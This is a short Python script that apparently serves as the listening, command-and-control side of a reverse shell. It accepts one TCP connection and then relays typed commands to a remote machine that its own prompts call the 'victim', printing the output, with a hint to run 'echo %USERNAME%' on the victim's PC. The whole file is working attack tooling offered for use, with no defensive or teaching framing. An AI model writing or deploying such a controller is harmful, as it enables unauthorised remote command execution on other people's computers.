import socket
ip = "localhost"
port = 12389
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
print("Waiting for a connection...")
s.listen(1)
conn, addr = s.accept()
print(f"{addr} connected wwith the server!\n(to get the pc victim username, type echo %USERNAME%)")
while True:
    command = input("VictimCMD$:  ")
    conn.send(command.encode())
    resp = conn.recv(8000)
    print("Command Sended!\n\n")
    print(resp.decode())